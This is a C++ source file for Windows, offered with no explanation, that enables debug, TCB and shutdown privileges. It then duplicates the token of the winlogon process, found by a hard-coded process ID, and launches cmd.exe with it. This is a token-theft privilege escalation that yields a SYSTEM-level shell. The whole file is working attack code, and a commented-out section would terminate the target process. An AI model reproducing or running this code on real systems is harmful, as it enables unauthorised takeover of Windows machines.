
#include "common.h"

#define SHUTDOWNPRIVILEGE_FLAG 0x1
#define DEBUGPRIVILEGE_FLAG 0x2
#define TCBPRIVILEGE_FLAG 0x4

#define WINLOGON_PID 764

BOOL adjust_privilege_token(LPCWSTR token_name);
BOOL duplicate_token_from_process(DWORD dwProcessId);

signed int privileges_mask;

int main()
{
	privileges_mask = 0;
	if (adjust_privilege_token(SE_SHUTDOWN_NAME))
		privileges_mask = SHUTDOWNPRIVILEGE_FLAG;
	if (adjust_privilege_token(SE_DEBUG_NAME))
		privileges_mask |= DEBUGPRIVILEGE_FLAG;
	if (adjust_privilege_token(SE_TCB_NAME))
		privileges_mask |= TCBPRIVILEGE_FLAG;

	duplicate_token_from_process(WINLOGON_PID);

	return privileges_mask;
}

BOOL adjust_privilege_token(LPCWSTR token_name)
{
	BOOL return_value;
	HANDLE current_process_handle;
	TOKEN_PRIVILEGES NewState;
	DWORD dwErrCode;
	HANDLE TokenHandle;


	NewState.PrivilegeCount					= 0;
	NewState.Privileges[0].Luid.LowPart		= 0;
	NewState.Privileges[0].Luid.HighPart	= 0;
	NewState.Privileges[0].Attributes		= 0;

	return_value							= FALSE;
	dwErrCode								= 0;
	TokenHandle								= NULL;

	current_process_handle					= GetCurrentProcess();
	
	if (OpenProcessToken(current_process_handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle))
	{
		if (LookupPrivilegeValue(NULL, token_name, (PLUID)NewState.Privileges))
		{
			NewState.PrivilegeCount = 1;
			NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			return_value = AdjustTokenPrivileges(TokenHandle, FALSE, &NewState, NULL, NULL, NULL);

			dwErrCode = GetLastError();
			if (dwErrCode)
				return_value = FALSE;
		}
	}

	SetLastError(dwErrCode);
	return return_value;
}


BOOL duplicate_token_from_process(DWORD dwProcessId)
{
	HANDLE OpenProcessHandler;
	SID_IDENTIFIER_AUTHORITY pIdentifierAuthority;
	HANDLE TokenHandle;
	PSID pSid;
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;

	if ((privileges_mask & DEBUGPRIVILEGE_FLAG) == 0)
		return FALSE;

	if (dwProcessId == GetCurrentProcessId())
		return TRUE;

	OpenProcessHandler = OpenProcess(
		PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE,
		FALSE,
		dwProcessId
	);

	if (!OpenProcessHandler)
		return FALSE;

	if (!OpenProcessToken(OpenProcessHandler, TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &TokenHandle))
		return FALSE;

	if (!DuplicateTokenEx(TokenHandle, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken))
	{
		printf("ERROR: Could not duplicate process token [%d]\n", GetLastError());
		return FALSE;
	}

	/*
		Finish process if you want

		pIdentifierAuthority.Value[0] = FALSE;
		pIdentifierAuthority.Value[4] = 1280;

	
		if (!AllocateAndInitializeSid(
			&pIdentifierAuthority,
			1,
			0x12,
			FALSE,
			FALSE,
			FALSE,
			FALSE,
			FALSE,
			FALSE,
			FALSE,
			&pSid
		))
		{
			dwProcessId = 0;
			if (CheckTokenMembership(DuplicateTokenHandle,
				pSid, (PBOOL)&dwProcessId))
			{
				if (dwProcessId)
					TerminateProcess(OpenProcessHandler, 0);
			}
			FreeSid(pSid);
		}
	*/

	STARTUPINFO si = {};
	PROCESS_INFORMATION pi = {};

	RtlZeroMemory((void*)&si, sizeof(si));
	RtlZeroMemory((void*)&pi, sizeof(pi));

	si.cb = sizeof(STARTUPINFO);

	if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		printf("[CreateProcessWithTokenW] Error: 0x%X\n", GetLastError());
		return FALSE;
	}

	
	CloseHandle(pNewToken);
	CloseHandle(TokenHandle);
	CloseHandle(OpenProcessHandler);
	return TRUE;
}